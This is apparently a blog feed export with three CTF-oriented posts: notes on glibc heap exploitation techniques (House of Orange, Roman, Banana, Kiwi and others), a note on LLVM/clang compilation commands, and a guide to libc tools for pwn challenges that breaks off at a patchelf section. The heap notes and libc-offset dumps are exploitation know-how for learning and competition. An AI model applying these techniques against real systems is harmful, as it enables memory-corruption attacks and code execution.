<p>Before the overflow:<img src="/imghost/hei/einherjar_before_overflow.png" alt="einherjar_before_overflow"><br>If we can overflow (fake) the <code>prev_size</code> and the <code>PREV_INUSE</code> (off-by-one), then:<img src="/imghost/hei/einherjar_overflowing.png" alt="einherjar_overflowing"><br>After the overflow, we get new chunk: <code>chunk_at_offset(p1, -((long) prevsize))</code> <img src="/imghost/hei/einherjar_after_overflow.png" alt="einherjar_after_overflow"><br>But there are constraints like <code>unlink</code> has, so we have to fake the structure at the corresponding chunk. </p>
<h2 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h2><p>Control top chunk’s size and lift&#x2F;lower top chunk address to control <code>GOT</code> items (can be used in VM escaping).</p>
<h2 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h2><p>Fake a small bin by changing <code>fd</code> and <code>bk</code> (bypass <code>malloc</code> check)</p>
<h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><p>It aims to exploit vulns to gain <code>free</code> ability, in a program without the function to <code>free</code>.</p>
<p>It mainly depends on the process when <code>top chunk</code> cannot meet the new <code>malloc</code> request. The old <code>top chunk</code> will be <code>freed</code> to <code>unsorted bin</code>, therefore we can obtain <code>unsorted bin</code> without <code>free</code> function.</p>
<p>Normally we carefully constructed the fake size of <code>top chunk</code>, and <code>malloc</code> a bigger <code>chunk</code> to link this <code>top chunk</code> into <code>unsorted bin</code>; next we are able to allocate <code>chunk</code> cutted from <code>unsorted bin</code>. Later exploitation part is related to IO_FILE. (More at <a href="/2020/10/26/2020-10-26-ADWorld-PWN-Challenge-Area-Write-ups-IO-FILE-related/">ADWorld PWN Challenge Area Write-ups (IO_FILE related)</a>)</p>
<p>Before <code>glibc</code> 2.23 the exploit is: modify <code>stdout</code> (e.g. <code>unsortedbin attack</code> to modify <code>_IO_list_all</code>, then using <code>unlink</code> of <code>unsortedbin</code> to put chunk into <code>smallbin</code>, which is the corresponding <code>_IO_list_all-&gt;_chain</code> linking fake <code>_IO_FILE</code>) and trigger <code>abort</code> of <code>libc</code>, use <code>_IO_flush_all_lockp</code> in <code>abort</code> to control program flow.</p>
<p>Whole calling process:<br><code>__libc_malloc</code> &#x3D;&gt; <code>malloc_printerr</code> &#x3D;&gt; <code>__libc_message</code> &#x3D;&gt; <code>abort</code> &#x3D;&gt; <code>_IO_flush_all_lockp</code><br><img src="/imghost/hei/abort_routine.001.jpg" alt="abort_routine.001"></p>
<p>After <code>glibc</code> 2.23 (like <code>glibc</code> 2.24) adds <code>_IO_vtable_check</code> which limits <code>vtable</code> address to be between <code>__stop___libc_IO_vtables</code> and <code>__start___libc_IO_vtables</code>. So we use <code>_IO_str_jumps-&gt;__finish</code>.</p>
<p>After <code>glibc</code> 2.27 the <code>flush</code> of stream is discarded.</p>
<p>As for House of Orange by thread, when the size of <code>thread_arena.top</code> is not enough it will call <code>sysmalloc</code> to extend <code>heap</code>, and if original heap is larger than <code>0x4000000</code> the <code>sysmalloc</code> will free <code>top chunk</code> and re-alloc in low address.</p>
<h2 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h2><p>Though it has a check for <code>size</code> when fetching <code>bin</code> in <code>fastbin</code>, there is no check when <code>malloc consolidate</code> works.</p>
<p>Therefore we can fake either <code>fd</code> or <code>size</code> part of the <code>fastbin</code>, and trigger <code>malloc consolidate</code> by merging the <code>top chunk</code> or <code>malloc</code> some big <code>chunk</code>.</p>
<p>After that we will find our forged overlapped <code>chunk</code>, or the <code>chunk</code> at our target address, in the <code>unsorted bin</code>, waiting to be allocated</p>
<h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h2><p>A trick combining <code>fastbin attack</code> with <code>unsorted bin attack</code>.</p>
<p>By modifying the size of a <code>chunk</code> which belongs to <code>unsorted bin</code> before to be a <code>fastbin chunk</code>, we can get the <code>main_arena + 0x88</code> remains in the <code>fd</code> of the <code>fastbin</code>. Then we can <code>malloc</code> the area around <code>main_arena + 0x88</code> like <code>malloc_hook</code>, and use <code>unsorted bin attack</code> to write a <code>main_arena + 0x88</code> (<code>libc</code> related address) to <code>malloc_hook</code>. By modifying the last 2 bytes, we can let <code>malloc_hook</code> points to <code>one gadget</code> (1&#x2F;16 chance)</p>
<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>It is to fake <code>chunk</code> by modifying just a little <code>bit</code>, get it freed to <code>fastbin</code>, and then allocate it to control a relatively big area.</p>
<h2 id="House-of-Banana"><a href="#House-of-Banana" class="headerlink" title="House of Banana"></a>House of Banana</h2><p>After <code>glibc 2.28</code> the <code>_int_malloc()</code> adds check for <code>bk</code> of <code>unsortedbin</code> to Invalidate <code>unsortedbin attack</code>. Then attackers consider <code>largebin attack</code> and using <code>House of Storm</code> to alloc anywhere.</p>
<p>However after <code>glibc</code> 2.29 the <code>House of Storm</code> is invalid, and after <code>glibc</code> 2.30 normal <code>largebin attack</code> also fails in some aspects (can only write <code>unsortedbin address</code> to anywhere in <code>glibc</code> 2.32, instead of writing any 2 heap addresses to 2 places).</p>
<p>The <code>House of Banana</code> starts from ptr <code>_rtld_global</code> in <code>ld.so</code> which pointing to struct <code>rtld_global</code>. There are many <code>_dl_ns</code> structs which store ELF segments symbol structs, include <code>fini_array</code> which is used in <code>_dl_fini()</code>.</p>
<p>So what <code>House of Banana</code> do is to fake a <code>rtld_global</code> struct, and using <code>largebin attack</code> to write heap addr into <code>rtld_global</code>. When the program exit, it will execute faked <code>fini_array</code>.</p>
<h2 id="House-of-Kiwi"><a href="#House-of-Kiwi" class="headerlink" title="House of Kiwi"></a>House of Kiwi</h2><p>Sometimes we encounter strict limits like sandbox restrictions, it gives us a special way to control the program.</p>
<p>First we should be able to trigger <code>__malloc_assert()</code> (heap overflow), second we should be able to write anywhere, edit <code>_IO_file_sync</code>, <code>IO_helper_jumps + 0xA0</code> and <code>IO_helper_jumps + 0xA8</code>.</p>
<p>In <code>__malloc_assert()</code> has a <code>flush(stderr)</code> which calls <code>_IO_file_jumps -&gt; sync</code> and there’re a few ways to trigger the assert.<br>By changing <code>_IO_file_sync</code> at <code>_IO_file_jumps + 0x60</code> as <code>setcontext + 61</code> and modifing <code>IO_helper_jumps + 0xA0 and 0xA8</code> as <code>ROP addr</code> and <code>ret gadget addr</code> can perform stack pivoting.</p>
<h2 id="House-of-Husk"><a href="#House-of-Husk" class="headerlink" title="House of Husk"></a>House of Husk</h2><p><a class="link"   href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507" >https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="Updating…"><a href="#Updating…" class="headerlink" title="Updating…"></a>Updating…</h2>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>uaf</tag>
        <tag>heap</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM Commands</title>
    <url>/2022/11/20/2022-11-20-LLVM-Commands/</url>
    <content><![CDATA[<p>Here are collections of LLVM commands about compilation using <code>clang</code> and some graph structure geneartion.</p>
<h2 id="LLVM-Compilation"><a href="#LLVM-Compilation" class="headerlink" title="LLVM Compilation"></a>LLVM Compilation</h2><p>To walk through the whole compilation using <code>clang</code>, first take the source <code>a.c</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">   <span class="keyword">int</span> b = <span class="number">200</span>;</span><br><span class="line">   <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">   ret = <span class="built_in">max</span>(a, b);</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">&quot;Max value is : %d\n&quot;</span>, ret );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> result;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> (num1 &gt; num2)</span><br><span class="line">      result = num1;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">      result = num2;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> result; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>And start to compile:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ clang -E a.c -o a.i   # pre-processing</span><br><span class="line">$ clang -S a.i -o a.s   # compiling</span><br><span class="line">$ clang -c a.s -o a.o   # assemble</span><br><span class="line">$ clang a.o             # linking</span><br><span class="line">$ ./a.out               </span><br><span class="line">Max value is : 200</span><br><span class="line"># or </span><br><span class="line">$ clang -save-temps a.c -o a.out    # save all intermediate temp files</span><br><span class="line">$ ls </span><br><span class="line">a.bc  a.c  a.i  a.o  a.out  a.s</span><br></pre></td></tr></table></figure>

<p>Here we can find an extra <code>a.bc</code>, which cannot be produced by <code>gcc</code>.<br>Actually LLVM compilation process includes following file formats:</p>
<ol>
<li><code>xxx.c</code>, Source code.</li>
<li><code>xxx.bc</code>, Assembly LLVM bitcode</li>
<li><code>xxx.ll</code>, Textual LLVM bitcode</li>
<li><code>xxx.s</code>, Assembly code</li>
<li><code>xxx.out</code>, Executable</li>
</ol>
<p>Like the image:<br><img src="/imghost/lc/format-cycle.png" alt="LLVM file formats"></p>
<p>From <code>a.c</code> we go through the whole file format converting cycle. To get <code>a.bc</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ clang -emit-llvm -c a.c -o a.bc</span><br></pre></td></tr></table></figure>
<p>And to get <code>a.ll</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ clang -emit-llvm -S a.c -o a.ll</span><br></pre></td></tr></table></figure>
<p>They can convert to each other by:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ llvm-dis a.bc -o a.ll     # a.bc -&gt; a.ll</span><br><span class="line">$ llvm-as a.ll -o a.bc      # a.ll -&gt; a.bc </span><br></pre></td></tr></table></figure>
<p>We can use <code>llc</code> to convert <code>a.bc</code> to <code>a.s</code>, and even visualize SelectionDAG on LLVM debug version:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ llc a.bc -o a.s</span><br><span class="line">$ llc -view-xxxxxx-dags a.ll    </span><br><span class="line"># &quot;--help&quot; to see all DAG generation options, </span><br><span class="line"># and the graph saved in &quot;dot&quot;</span><br></pre></td></tr></table></figure>
<p>And to execute <code>a.bc</code> directly:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ lli a.bc</span><br><span class="line">Max value is : 200 </span><br></pre></td></tr></table></figure>
<p>Actually the intermediate files can be converted to exetuable <code>a.out</code> by using <code>clang</code> directly:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ clang a.s/a.c/a.xxx a.out</span><br></pre></td></tr></table></figure>

<h2 id="LLVM-Graph-Structure-Generation"><a href="#LLVM-Graph-Structure-Generation" class="headerlink" title="LLVM Graph Structure Generation"></a>LLVM Graph Structure Generation</h2><p>LLVM framework is so powerful, that it can automatically generate control flow graph, and we can visualize it easily.<br>First we generate CFG using <code>opt</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ opt -enable-new-pm=0 -analyze -dot-cfg-only a.ll</span><br><span class="line">Writing &#x27;.main.dot&#x27;...</span><br><span class="line">Printing analysis &#x27;Print CFG of function to &#x27;dot&#x27; file (with no function bodies)&#x27; for function &#x27;main&#x27;:</span><br><span class="line">Writing &#x27;.max.dot&#x27;...</span><br><span class="line">Printing analysis &#x27;Print CFG of function to &#x27;dot&#x27; file (with no function bodies)&#x27; for function &#x27;max&#x27;:</span><br></pre></td></tr></table></figure>
<p>And we get <code>.main.dot</code> and <code>.max.dot</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat .main.dot</span><br><span class="line">digraph &quot;CFG for &#x27;main&#x27; function&quot; &#123;</span><br><span class="line">        label=&quot;CFG for &#x27;main&#x27; function&quot;;</span><br><span class="line"></span><br><span class="line">        Node0xe3b210 [shape=record,color=&quot;#b70d28ff&quot;, style=filled, fillcolor=&quot;#b70d2870&quot;,label=&quot;&#123;%0&#125;&quot;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ cat .max.dot</span><br><span class="line">digraph &quot;CFG for &#x27;max&#x27; function&quot; &#123;</span><br><span class="line">        label=&quot;CFG for &#x27;max&#x27; function&quot;;</span><br><span class="line"></span><br><span class="line">        Node0xe3c470 [shape=record,color=&quot;#b70d28ff&quot;, style=filled, fillcolor=&quot;#b70d2870&quot;,label=&quot;&#123;%2|&#123;&lt;s0&gt;T|&lt;s1&gt;F&#125;&#125;&quot;];</span><br><span class="line">        Node0xe3c470:s0 -&gt; Node0xe3c5e0;</span><br><span class="line">        Node0xe3c470:s1 -&gt; Node0xe3c930;</span><br><span class="line">        Node0xe3c5e0 [shape=record,color=&quot;#3d50c3ff&quot;, style=filled, fillcolor=&quot;#f59c7d70&quot;,label=&quot;&#123;%9&#125;&quot;];</span><br><span class="line">        Node0xe3c5e0 -&gt; Node0xe3cb70;</span><br><span class="line">        Node0xe3c930 [shape=record,color=&quot;#3d50c3ff&quot;, style=filled, fillcolor=&quot;#f59c7d70&quot;,label=&quot;&#123;%11&#125;&quot;];</span><br><span class="line">        Node0xe3c930 -&gt; Node0xe3cb70;</span><br><span class="line">        Node0xe3cb70 [shape=record,color=&quot;#b70d28ff&quot;, style=filled, fillcolor=&quot;#b70d2870&quot;,label=&quot;&#123;%13&#125;&quot;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>To visualize, install libraries first:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt install graphviz</span><br></pre></td></tr></table></figure>
<p>And then use <code>dot</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ dot .main.dot -T png -o main.cfg.png</span><br><span class="line">$ dot .max.dot -T jpeg -o max.cfg.jpg</span><br></pre></td></tr></table></figure>
<p>And the results:<br><img src="/imghost/lc/main.cfg.png" alt="main.cfg.png"><br><img src="/imghost/lc/max.cfg.jpg" alt="max.cfg.jpg"></p>
<p>Some other options:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ opt -h|grep &quot;\-cfg&quot;</span><br><span class="line">  --cfg-hide-cold-paths=&lt;number&gt;                                        - Hide blocks with relative frequency below the given value</span><br><span class="line">  --cfg-hide-deoptimize-paths                                           -</span><br><span class="line">  --cfg-hide-unreachable-paths                                          -</span><br><span class="line">  --dot-cfg-mssa=&lt;file name for generated dot file&gt;                     - file name for generated dot file</span><br><span class="line">      --dot-cfg                                                            - Print CFG of function to &#x27;dot&#x27; file</span><br><span class="line">      --dot-cfg-only                                                       - Print CFG of function to &#x27;dot&#x27; file (with no function bodies)</span><br><span class="line">      --print-cfg-sccs                                                     - Print SCCs of each function CFG</span><br><span class="line">      --view-cfg                                                           - View CFG of function</span><br><span class="line">      --view-cfg-only                                                      - View CFG of function (with no function bodies)</span><br><span class="line">      --wasm-cfg-sort                                                      - Reorders blocks in topological order</span><br><span class="line">      --wasm-cfg-stackify                                                  - Insert BLOCK/LOOP/TRY markers for WebAssembly scopes</span><br><span class="line"></span><br><span class="line">$ opt -h|grep callgraph</span><br><span class="line">      --dot-callgraph                                                      - Print call graph to &#x27;dot&#x27; file</span><br><span class="line">      --print-callgraph                                                    - Print a call graph</span><br><span class="line">      --print-callgraph-sccs                                               - Print SCCs of the Call Graph</span><br><span class="line">      --view-callgraph                                                     - View call graph</span><br></pre></td></tr></table></figure>

<h2 id="LLVM-Grammar"><a href="#LLVM-Grammar" class="headerlink" title="LLVM Grammar"></a>LLVM Grammar</h2><p>stay tuned …</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>linux</tag>
        <tag>llvm</tag>
      </tags>
  </entry>
  <entry>
    <title>Handle Pwn Libc and Host a Pwn</title>
    <url>/2021/07/31/2021-07-31-Handle-Pwn-Libc-and-Host-a-Pwn/</url>
    <content><![CDATA[<p>This blog introduces tools to deal with <code>libc</code> problems in <code>pwn</code> and to host <code>pwn</code> challenges.</p>
<h2 id="Pwn-Libc-Part"><a href="#Pwn-Libc-Part" class="headerlink" title="Pwn Libc Part"></a>Pwn Libc Part</h2><p>The <code>libc</code> version matters in <code>Linux</code> pwn challenges. Using different <code>libc</code> means having different gadgets, different heap mechanisms and maybe totally differrnt program behaviors.</p>
<p>Ubuntu 16.04 gets <code>libc 2.23</code>, Ubuntu 18.04 gets <code>libc 2.27</code>, the newer versions gets <code>libc 2.29</code>, <code>libc 2.30</code> and even <code>libc 2.31</code>. This is always the reason why some newcomers cannot test the exploit scripts on their own machine, or they may not even run program successfully. All due to the wrong <code>libc</code> using.</p>
<p>This part provides you with some <code>libc</code> related tools.</p>
<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a><a class="link"   href="https://github.com/lieanu/LibcSearcher" >LibcSearcher<i class="fas fa-external-link-alt"></i></a></h3><p>It is a tool on <a class="link"   href="https://github.com/lieanu/LibcSearcher" >github<i class="fas fa-external-link-alt"></i></a>, helps determine which  <code>libc</code> the remote server is using (according to function addresses you leaked, like some online searching sites)</p>
<p>To install</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">$ <span class="built_in">cd</span> LibcSearcher</span><br><span class="line">$ python setup.py develop</span><br></pre></td></tr></table></figure>
<p>Usage</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># the 2rd arg should be address you leaked</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"><span class="comment"># if it&#x27;s not unique, it will prompt you to choose manually, or u can try `add_condition(leaked_func, leaked_address)`</span></span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment"># offset of &#x27;system()&#x27; in libc</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment"># offset of &#x27;/bin/sh&#x27; string in libc</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)    </span><br></pre></td></tr></table></figure>
<p>With this you can not only know the remote <code>libc</code></p>
<h3 id="pwn-debug"><a href="#pwn-debug" class="headerlink" title="pwn_debug"></a><a class="link"   href="https://github.com/ray-cp/pwn_debug" >pwn_debug<i class="fas fa-external-link-alt"></i></a></h3><p>It’s like an advanced <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a>, with the ability to run different <code>libc</code>on one host machine.</p>
<p>Start with installation</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/ray-cp/pwn_debug.git</span><br><span class="line">$ <span class="built_in">cd</span> pwn_debug</span><br><span class="line">$ sudo python setup.py install </span><br><span class="line"><span class="comment"># or python setup.py install --user</span></span><br></pre></td></tr></table></figure>
<p>Then download and compile <code>glibc</code> with debug symbols</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># compile specific version</span></span><br><span class="line"><span class="comment"># ./build.sh $(version)</span></span><br><span class="line">$ ./build.sh 2.23</span><br><span class="line"></span><br><span class="line"><span class="comment"># compile all versions in &#x27;./build.sh&#x27;</span></span><br><span class="line">$ ./build.sh</span><br></pre></td></tr></table></figure>
<p>They are all located in <code>/glibc/*</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ls /glibc/</span><br><span class="line">$ <span class="built_in">source</span>  x64  x86</span><br></pre></td></tr></table></figure>
<p>And the normal usage is divided into 3 steps:</p>
<ol>
<li>Import and declare object</li>
<li>Set the mode parameters, three mode in total: <code>debug</code>, <code>local</code> and <code>remote</code>.</li>
<li>Run the mode and interactive like using <code>pwntools</code><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">## step 1</span></span><br><span class="line">pdbg=pwn_debug(<span class="string">&quot;binary&quot;</span>)        <span class="comment"># specific the binary filename</span></span><br><span class="line">pdbg.context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]  <span class="comment"># set terminal</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## step 2</span></span><br><span class="line">pdbg.local(<span class="string">&quot;libc.so.6&quot;</span>)     <span class="comment"># local libc file</span></span><br><span class="line">pdbg.debug(<span class="string">&quot;2.23&quot;</span>)          <span class="comment"># libc in /glibc/*</span></span><br><span class="line">pdbg.remote(<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;port&#x27;</span>)  <span class="comment"># remote address</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## step 3</span></span><br><span class="line"><span class="comment">#p=pdbg.run(&quot;local&quot;)</span></span><br><span class="line"><span class="comment">#p=pdbg.run(&quot;debug&quot;)</span></span><br><span class="line">p=pdbg.run(<span class="string">&quot;remote&quot;</span>)    <span class="comment"># choose mode</span></span><br><span class="line"></span><br><span class="line">pdbg.bp([<span class="number">0x9aa</span>])        <span class="comment"># easy to set breakpoint, regardless of PIE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the followings are pwntools functions</span></span><br><span class="line">elf=pdbg.elf</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line"></span><br><span class="line">libc=pdbg.libc</span><br><span class="line"><span class="built_in">print</span> libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
More usages on <a class="link"   href="https://github.com/ray-cp/pwn_debug/wiki/Usage" >github wiki<i class="fas fa-external-link-alt"></i></a>, btw this is for <code>Python2</code>, <code>Python3</code> users need to modify <code>print</code> formats and some <code>import</code> parts to make it work.</li>
</ol>
<h3 id="glibc-all-in-one-and-libc-database"><a href="#glibc-all-in-one-and-libc-database" class="headerlink" title="glibc-all-in-one and libc-database"></a><a class="link"   href="https://github.com/matrix1001/glibc-all-in-one" >glibc-all-in-one<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://github.com/niklasb/libc-database" >libc-database<i class="fas fa-external-link-alt"></i></a></h3><p><a class="link"   href="https://github.com/matrix1001/glibc-all-in-one" >glibc-all-in-one<i class="fas fa-external-link-alt"></i></a> is just for debugging different version <code>libc</code> with symbols (it can assist <code>pwn_debug</code>), and <a class="link"   href="https://github.com/niklasb/libc-database" >libc-database<i class="fas fa-external-link-alt"></i></a> is for ctfers to get the version of remote server responding to leaked information (the engine of <code>LibcSearcher</code>). </p>
<ul>
<li><code>glibc-all-in-one</code></li>
</ul>
<p>You can update the libc list</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./update_list</span><br><span class="line">[+] Common list has been save to &quot;list&quot;</span><br><span class="line">[+] Old-release list has been save to &quot;old_list&quot;</span><br><span class="line"></span><br><span class="line">$ cat old_list</span><br><span class="line">2.21-0ubuntu4.3_amd64</span><br><span class="line">2.21-0ubuntu4.3_i386</span><br><span class="line">...</span><br><span class="line">2.30-0ubuntu2_amd64</span><br><span class="line">2.30-0ubuntu2_i386</span><br><span class="line"></span><br><span class="line">$ cat list</span><br><span class="line">2.23-0ubuntu11.3_amd64</span><br><span class="line">2.23-0ubuntu11.3_i386</span><br><span class="line">...</span><br><span class="line">2.33-0ubuntu9_amd64</span><br><span class="line">2.33-0ubuntu9_i386</span><br></pre></td></tr></table></figure>
<p>use <code>download</code> for packages in the <code>list</code>; use <code>download_old</code> for packages in the <code>old_list</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ glibc-all-in-one ./download 2.23-0ubuntu10_i386</span><br><span class="line">Getting 2.23-0ubuntu10_i386</span><br><span class="line">  -&gt; Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_i386.deb</span><br><span class="line">  -&gt; Downloading libc binary package</span><br><span class="line">  -&gt; Extracting libc binary package</span><br><span class="line">  -&gt; Package saved to libs/2.23-0ubuntu10_i386</span><br><span class="line">  -&gt; Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6-dbg_2.23-0ubuntu10_i386.deb</span><br><span class="line">  -&gt; Downloading libc debug package</span><br><span class="line">  -&gt; Extracting libc debug package</span><br><span class="line">  -&gt; Package saved to libs/2.23-0ubuntu10_i386/dbg</span><br><span class="line">$ ls libs/2.23-0ubuntu10_i386</span><br><span class="line">. .. .debug  ld-2.23.so  libc-2.23.so  libpthread.so.0   ......</span><br><span class="line">$ ls libs/2.23-0ubuntu10_i386/.debug</span><br><span class="line">ld-2.23.so  libc-2.23.so   ......</span><br></pre></td></tr></table></figure>
<p>Need additional libc packages, use <code>extract</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./extract</span><br><span class="line">Usage: ./extract deb output</span><br><span class="line">$ ./extract ~/libc6_2.26-0ubuntu2_i386.deb /tmp/test</span><br><span class="line">$ ./extract ~/libc6-dbg_2.26-0ubuntu2_i386.deb /tmp/test_dbg</span><br></pre></td></tr></table></figure>
<p>Then build as</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$  ./build</span><br><span class="line">Usage: ./build version arch</span><br><span class="line">Supported version:2.19, 2.23-2.29</span><br><span class="line">Supported arch: i686, amd64</span><br><span class="line">$ ./build 2.29 i686</span><br></pre></td></tr></table></figure>

<ul>
<li><code>libc-database</code></li>
</ul>
<p>First install some dependencies:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ apt-get update</span><br><span class="line">$ apt-get install -y \</span><br><span class="line">  binutils file \</span><br><span class="line">  wget \</span><br><span class="line">  rpm2cpio cpio \</span><br><span class="line">  zstd jq</span><br></pre></td></tr></table></figure>

<p>The <a class="link"   href="https://libc.rip/" >online version<i class="fas fa-external-link-alt"></i></a> is available and you can build one using <a class="link"   href="https://github.com/niklasb/libc-database/tree/master/searchengine" >libc-database&#x2F;searchengine<i class="fas fa-external-link-alt"></i></a>.<br>Fetch the desired libc categories and extract the symbol offsets, and update database:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./get  # List categories</span><br><span class="line">$ ./get ubuntu debian  # Download Ubuntu&#x27;s and Debian&#x27;s libc, old default behavior</span><br><span class="line">$ ./get all  # Download all categories. Can take a while!</span><br></pre></td></tr></table></figure>
<p>Add a custom libc: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./add /usr/lib/libc-2.21.so</span><br></pre></td></tr></table></figure>
<p>Find the libc you want using leaking addresses. Only the last 12 bits are checked, because randomization usually works on page size level.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./find printf 260 puts f30</span><br><span class="line">archive-glibc (libc6_2.19-10ubuntu2_i386)</span><br></pre></td></tr></table></figure>
<p>Dump some useful offsets</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./dump libc6_2.19-0ubuntu6.6_i386</span><br><span class="line">offset___libc_start_main_ret = 0x19a83</span><br><span class="line">offset_system = 0x00040190</span><br><span class="line">offset_dup2 = 0x000db590</span><br><span class="line">offset_recv = 0x000ed2d0</span><br><span class="line">offset_str_bin_sh = 0x160a24</span><br></pre></td></tr></table></figure>
<p>And check whether a library is already in the database</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./identify /usr/lib/libc.so.6</span><br><span class="line">local-f706181f06104ef6c7008c066290ea47aa4a82c5</span><br></pre></td></tr></table></figure>

<h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a><a class="link"   href="https://github.com/NixOS/patchelf" >patchelf<i class="fas fa-external-link-alt"></i></a></h3><p>PatchELF is a simple utility for modifying existing ELF executables and libraries. It helps program run on own library path <code>RPATH</code> and cunstom <code>libc</code> like <code>pwn_debug</code>, and so on.</p>
<p>Installation</p>
